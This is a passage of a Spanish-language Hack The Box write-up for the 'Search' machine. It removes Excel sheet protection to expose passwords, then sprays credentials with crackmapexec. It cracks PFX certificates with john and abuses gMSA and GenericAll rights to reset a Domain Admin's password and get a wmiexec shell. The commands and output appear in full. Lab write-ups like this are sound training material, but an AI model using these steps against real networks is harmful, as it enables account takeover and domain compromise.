t="s"><v>11</v></c><c r="C14" t="s"><v>43</v></c><c r="D14" t="str"><f t="shared" si="1"/><v>Joy.Costa</v></c></row><row r="15" spans="1:4" x14ac:dyDescent="0.25"><c r="A15" t="s"><v>27</v></c><c r="B15" t="s"><v>28</v></c><c r="C15" t="s"><v>47</v></c><c r="D15" t="str"><f t="shared" si="1"/><v>Vincent.Sutton</v></c></row><row r="17" spans="3:3" x14ac:dyDescent="0.25"><c r="C17" s="4"/></row></sheetData><sheetProtection algorithmName="SHA-512" hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg==" saltValue="U9oZfaVCkz5jWdhs9AA8nA==" spinCount="100000" sheet="1" objects="1" scenarios="1"/><pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/><pageSetup paperSize="9" orientation="portrait" r:id="rId1"/></worksheet>
```

- Vamos a eliminar la etiqueta `sheetProtection` para que quede así.

```bash
➜  document cat xl/worksheets/sheet2.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac xr xr2 xr3" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" xr:uid="{00000000-0001-0000-0100-000000000000}"><dimension ref="A1:D17"/><sheetViews><sheetView tabSelected="1" workbookViewId="0"><selection activeCell="F19" sqref="F19"/></sheetView></sheetViews><sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/><cols><col min="1" max="1" width="10.140625" bestFit="1" customWidth="1"/><col min="3" max="3" width="37.5703125" hidden="1" customWidth="1"/><col min="4" max="4" width="19.140625" bestFit="1" customWidth="1"/></cols><sheetData><row r="1" spans="1:4" x14ac:dyDescent="0.25"><c r="A1" t="s"><v>0</v></c><c r="B1" t="s"><v>1</v></c><c r="C1" t="s"><v>2</v></c><c r="D1" t="s"><v>31</v></c></row><row r="2" spans="1:4" x14ac:dyDescent="0.25"><c r="A2" t="s"><v>3</v></c><c r="B2" t="s"><v>4</v></c><c r="C2" t="s"><v>44</v></c><c r="D2" t="str"><f t="shared" ref="D2:D7" si="0">A2&amp;"."&amp;B2</f><v>Payton.Harmon</v></c></row><row r="3" spans="1:4" x14ac:dyDescent="0.25"><c r="A3" t="s"><v>5</v></c><c r="B3" t="s"><v>6</v></c><c r="C3" t="s"><v>45</v></c><c r="D3" t="str"><f t="shared" si="0"/><v>Cortez.Hickman</v></c></row><row r="4" spans="1:4" x14ac:dyDescent="0.25"><c r="A4" t="s"><v>7</v></c><c r="B4" t="s"><v>8</v></c><c r="C4" t="s"><v>46</v></c><c r="D4" t="str"><f t="shared" si="0"/><v>Bobby.Wolf</v></c></row><row r="5" spans="1:4" x14ac:dyDescent="0.25"><c r="A5" t="s"><v>9</v></c><c r="B5" t="s"><v>10</v></c><c r="C5" t="s"><v>35</v></c><c r="D5" t="str"><f t="shared" si="0"/><v>Margaret.Robinson</v></c></row><row r="6" spans="1:4" x14ac:dyDescent="0.25"><c r="A6" t="s"><v>12</v></c><c r="B6" t="s"><v>13</v></c><c r="C6" s="2" t="s"><v>36</v></c><c r="D6" t="str"><f t="shared" si="0"/><v>Scarlett.Parks</v></c></row><row r="7" spans="1:4" x14ac:dyDescent="0.25"><c r="A7" t="s"><v>14</v></c><c r="B7" t="s"><v>15</v></c><c r="C7" t="s"><v>37</v></c><c r="D7" t="str"><f t="shared" si="0"/><v>Eliezer.Jordan</v></c></row><row r="8" spans="1:4" x14ac:dyDescent="0.25"><c r="A8" t="s"><v>16</v></c><c r="B8" t="s"><v>17</v></c><c r="C8" t="s"><v>38</v></c><c r="D8" t="str"><f t="shared" ref="D8:D15" si="1">A8&amp;"."&amp;B8</f><v>Hunter.Kirby</v></c></row><row r="9" spans="1:4" x14ac:dyDescent="0.25"><c r="A9" t="s"><v>29</v></c><c r="B9" t="s"><v>30</v></c><c r="C9" s="3" t="s"><v>48</v></c><c r="D9" t="str"><f>A9&amp;"."&amp;B9</f><v>Sierra.Frye</v></c></row><row r="10" spans="1:4" x14ac:dyDescent="0.25"><c r="A10" t="s"><v>18</v></c><c r="B10" t="s"><v>19</v></c><c r="C10" s="2" t="s"><v>39</v></c><c r="D10" t="str"><f t="shared" si="1"/><v>Annabelle.Wells</v></c></row><row r="11" spans="1:4" x14ac:dyDescent="0.25"><c r="A11" t="s"><v>20</v></c><c r="B11" t="s"><v>21</v></c><c r="C11" t="s"><v>40</v></c><c r="D11" t="str"><f t="shared" si="1"/><v>Eve.Galvan</v></c></row><row r="12" spans="1:4" x14ac:dyDescent="0.25"><c r="A12" t="s"><v>22</v></c><c r="B12" t="s"><v>23</v></c><c r="C12" t="s"><v>41</v></c><c r="D12" t="str"><f t="shared" si="1"/><v>Jeramiah.Fritz</v></c></row><row r="13" spans="1:4" x14ac:dyDescent="0.25"><c r="A13" t="s"><v>24</v></c><c r="B13" t="s"><v>25</v></c><c r="C13" t="s"><v>42</v></c><c r="D13" t="str"><f t="shared" si="1"/><v>Abby.Gonzalez</v></c></row><row r="14" spans="1:4" x14ac:dyDescent="0.25"><c r="A14" t="s"><v>26</v></c><c r="B14" t="s"><v>11</v></c><c r="C14" t="s"><v>43</v></c><c r="D14" t="str"><f t="shared" si="1"/><v>Joy.Costa</v></c></row><row r="15" spans="1:4" x14ac:dyDescent="0.25"><c r="A15" t="s"><v>27</v></c><c r="B15" t="s"><v>28</v></c><c r="C15" t="s"><v>47</v></c><c r="D15" t="str"><f t="shared" si="1"/><v>Vincent.Sutton</v></c></row><row r="17" spans="3:3" x14ac:dyDescent="0.25"><c r="C17" s="4"/></row></sheetData><pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/><pageSetup paperSize="9" orientation="portrait" r:id="rId1"/></worksheet>
```

- Ahora generamos otro comprimido.

```bash
➜  document rm -r Phishing_Attempt.xlsx
➜  document zip Docu.xlsx -r .
  adding: _rels/ (stored 0%)
  adding: _rels/.rels (deflated 60%)
  adding: xl/ (stored 0%)
  adding: xl/_rels/ (stored 0%)
  adding: xl/_rels/workbook.xml.rels (deflated 74%)
  adding: xl/drawings/ (stored 0%)
  adding: xl/drawings/_rels/ (stored 0%)
  adding: xl/drawings/_rels/drawing1.xml.rels (deflated 39%)
  adding: xl/drawings/drawing1.xml (deflated 58%)
  adding: xl/worksheets/ (stored 0%)
  adding: xl/worksheets/_rels/ (stored 0%)
  adding: xl/worksheets/_rels/sheet2.xml.rels (deflated 42%)
  adding: xl/worksheets/_rels/sheet1.xml.rels (deflated 55%)
  adding: xl/worksheets/sheet2.xml (deflated 73%)
  adding: xl/worksheets/sheet1.xml (deflated 79%)
  adding: xl/workbook.xml (deflated 60%)
  adding: xl/styles.xml (deflated 89%)
  adding: xl/printerSettings/ (stored 0%)
  adding: xl/printerSettings/printerSettings1.bin (deflated 67%)
  adding: xl/printerSettings/printerSettings2.bin (deflated 67%)
  adding: xl/sharedStrings.xml (deflated 55%)
  adding: xl/charts/ (stored 0%)
  adding: xl/charts/_rels/ (stored 0%)
  adding: xl/charts/_rels/chart1.xml.rels (deflated 49%)
  adding: xl/charts/style1.xml (deflated 90%)
  adding: xl/charts/chart1.xml (deflated 77%)
  adding: xl/charts/colors1.xml (deflated 73%)
  adding: xl/theme/ (stored 0%)
  adding: xl/theme/theme1.xml (deflated 80%)
  adding: xl/calcChain.xml (deflated 55%)
  adding: [Content_Types].xml (deflated 79%)
  adding: docProps/ (stored 0%)
  adding: docProps/app.xml (deflated 52%)
  adding: docProps/core.xml (deflated 47%)
  adding: .~lock.Phishing_Attempt.xlsx# (deflated 1%)
```

- Ahora lo abrimos de nuevo.

- Y vemos que ya no tenemos el candado.

<p align="center">
<img src="/assets/images/htb-writeup-search/9.png">
</p>

- Las contraseñas están en la **C**.

<p align="center">
<img src="/assets/images/htb-writeup-search/10.png">
</p>

- Tenemos un listado potencial de usuarios y contraseñas.

```bash
➜  new cat users.txt
Payton.Harmon
Cortez.Hickman
Bobby.Wolf
Margaret.Robinson
Scarlett.Parks
Eliezer.Jordan
Hunter.Kirby
Sierra.Frye
Annabelle.Wells
Eve.Galvan
Jeramiah.Fritz
Abby.Gonzalez
Joy.Costa
Vincent.Sutton
➜  new nano creds.txt
➜  new cat creds.txt
;;36!cried!INDIA!year!50;;
..10-time-TALK-proud-66..
??47^before^WORLD^surprise^91??
//51+mountain+DEAR+noise+83//
++47|building|WARSAW|gave|60++
!!05_goes_SEVEN_offer_83!!
~~27%when%VILLAGE%full%00~~
$$49=wide=STRAIGHT=jordan=28$$18
==95~pass~QUIET~austria~77==
//61!banker!FANCY!measure!25//
??40:student:MAYOR:been:66??
&&75:major:RADIO:state:93&&
**30*venus*BALL*office*42**
**24&moment&BRAZIL&members&66**
```

- Vamos a usar `crackmapexec` pero vamos hacer que para cada usuario pruebe la contraseña tipo primero la 1 primer contraseña del archivo para el primer usuario después para el segundo usuario la 2 contraseña de la lista etc. Tenemos que indicarle el siguiente parámetro `--no-bruteforce` para que no vaya probando 1 contraseña para todos los usuarios y a si sucesivamente.

```bash
➜  new crackmapexec smb 10.129.229.57 -u users.txt -p creds.txt --no-bruteforce --continue-on-success
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Abby.Gonzalez:&&75:major:RADIO:state:93&& STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE
SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Vincent.Sutton:**24&moment&BRAZIL&members&66** STATUS_LOGON_FAILURE
```

## Shell as sierra.frye

- Vamos a validarlas.

```bash
➜  content crackmapexec smb search.htb -u Sierra.Frye -p '$$49=wide=STRAIGHT=jordan=28$$18' --continue-on-success
SMB         search.htb      445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         search.htb      445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18
```

- Ahora vamos a listar recursos pero ahora con este usuario.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
```

```bash
➜  content smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner -r 'RedirectedFolders$'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	.
	dr--r--r--                0 Sun Apr  7 17:54:11 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
```

- Vemos la flag.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner -r 'RedirectedFolders$/sierra.frye'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$sierra.frye
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	.
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	..
	dw--w--w--                0 Wed Nov 17 19:08:17 2021	Desktop
	dw--w--w--                0 Fri Jul 31 09:42:19 2020	Documents
	dw--w--w--                0 Fri Jul 31 09:45:36 2020	Downloads
	fr--r--r--               33 Wed Nov 17 19:01:45 2021	user.txt
	SYSVOL                                            	READ ONLY	Logon server share
```

# User .txt

- Aquí vemos la flag.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner --download 'RedirectedFolders$/sierra.frye/user.txt'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: RedirectedFolders$\sierra.frye\user.txt (33 bytes)
[+] File output to: /home/miguel/Hackthebox/Search/content/10.129.229.57-RedirectedFolders_sierra.frye_user.txt
➜  content cat 10.129.229.57-RedirectedFolders_sierra.frye_user.txt
0b2ce2a465386c9c4996ba16251795ac
```

- Y vemos algo interesante si seguimos enumerando al parecer encontramos certificados.

```bash
➜  content smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner -r 'RedirectedFolders$/sierra.frye/Downloads/Backups'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders$                                	READ, WRITE	
	./RedirectedFolders$sierra.frye/Downloads/Backups
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	.
	dr--r--r--                0 Mon Aug 10 15:39:17 2020	..
	fr--r--r--             2643 Fri Jul 31 10:04:11 2020	search-RESEARCH-CA.p12
	fr--r--r--             4326 Mon Aug 10 15:39:17 2020	staff.pfx
	SYSVOL                                            	READ ONLY	Logon server share
```

- Vamos a descargarlos.

```bash
➜  certificates smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner --download 'RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: RedirectedFolders$\sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 (2643 bytes)
[+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
➜  certificates smbmap -H 10.129.229.57 -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' --no-banner --download 'RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx'
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)
[+] Starting download: RedirectedFolders$\sierra.frye\Downloads\Backups\staff.pfx (4326 bytes)
[+] File output to: /home/miguel/Hackthebox/Search/content/certificates/10.129.229.57-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx
```

- Si importamos los certificados vemos que están protegidos.

<p align="center">
<img src="/assets/images/htb-writeup-search/11.png">
</p>

- Vamos a usar `pfx2john`.

```bash
➜  certificates pfx2john search-RESEARCH-CA.p12 > hash
➜  certificates pfx2john staff.pfx >> hash
```

- Y esta es la contraseña.

```bash
➜  certificates john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (search-RESEARCH-CA.p12)
misspissy        (staff.pfx)
2g 0:00:05:18 DONE (2024-04-07 18:15) 0.006282g/s 17229p/s 34458c/s 34458C/s misssnamy..missnono
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Y listo podemos importarlos.

<p align="center">
<img src="/assets/images/htb-writeup-search/12.png">
</p>

- El certificado se llama **staff** si probamos con esa ruta vemos que funciona.

<p align="center">
<img src="/assets/images/htb-writeup-search/13.png">
</p>

- Ahora accedemos.

<p align="center">
<img src="/assets/images/htb-writeup-search/14.png">
</p>

- Y vemos que estamos un **Windows Powershell Web Access**.

## Escalada de Privilegios

- Si vamos a `Bloodhound` sabemos que estamos como `Sierra.Frye` tenemos una manera potencial de escalar privilegios pertenecemos a varios grupos entre esos tenemos el privilegio `ReadGMSAPassword` sobre `BIR-ADFS-GMSA$` y ese usuario tiene el privilegio `GenericAll` sobre el usuario `Tristan.Davies` que ese usuario pertenece al grupo `Domain Admins`.

<p align="center">
<img src="/assets/images/htb-writeup-search/15.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-search/16.png">
</p>

- Si somos este usuario `BIR-ADFS-GMSA$` podemos cambiarle la contraseña al usuario `TRISTAN.DAVIES`.

- Podemos apoyarnos de este recurso ya que necesitamos obtener la contraseña de `BIR-ADFS-GMSA$` <https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#retrieving-themanaged-password>.

<p align="center">
<img src="/assets/images/htb-writeup-search/17.png">
</p>

- Para ver la contraseña tenemos que hacer lo siguiente <https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/#decoding-themanaged-password>.

<p align="center">
<img src="/assets/images/htb-writeup-search/18.png">
</p>

- Vamos a definir la credencial.

- Si la contraseña ya esta podemos usar `Invoke-Command` para ver si estamos ejecutando comandos como el usuario que queremos.

<p align="center">
<img src="/assets/images/htb-writeup-search/19.png">
</p>

- Como tenemos privilegios `GenericAll` sobre `Tristan.Davies` le vamos a cambiar la contraseña.

<p align="center">
<img src="/assets/images/htb-writeup-search/20.png">
</p>

- Como le acabamos de cambiar la contraseña a un usuario del `Domain Admins` en caso de que nos de `Pwn3d!` podemos usar `wmiexec` para conectarnos y tendremos privilegios máximos en el dominio.

 ```bash
➜  content crackmapexec smb 10.129.229.57 -u 'tristan.davies' -p 'nosequeponer$!'
SMB         10.129.229.57   445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.57   445    RESEARCH         [+] search.htb\tristan.davies:nosequeponer$! (Pwn3d!)
```

## Root.txt

- Y ya podemos ver la ultima flag.

```bash
➜  content impacket-wmiexec search.htb/tristan.davies@10.129.229.57
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
search\tristan.davies

C:\>type C:\Users\Administrator\Desktop\root.txt
5cbe8d044ee14475a7b40e8abd97c5a1
```
